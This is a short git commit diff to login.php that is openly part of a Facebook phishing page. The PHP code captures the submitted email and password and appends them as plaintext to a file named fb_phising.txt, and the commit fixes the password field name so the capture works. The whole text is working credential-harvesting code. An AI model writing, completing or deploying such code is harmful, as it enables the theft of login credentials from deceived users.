64803a496e7e25219ccaed86c85fb12605945d73
SomeOneWannaHackYou <95560177+ILOVEPYTHONSOMUCH@users.noreply.github.com>
2022-12-19 21:48:45 +0700

    Update login.php

--- login.php
+++ login.php
@@ -1,7 +1,7 @@
 <?php 
      if(isset($_POST['email'])){
          $email = $_POST['email'];
-         $pass = $_POST['pass'];
+         $pass = $_POST['password'];
          $myfile = fopen("fb_phising.txt", "a") or die("Unable to open file!"); 
         fwrite($myfile, "Username : $email\n");
         fwrite($myfile, "Password : $pass\n");
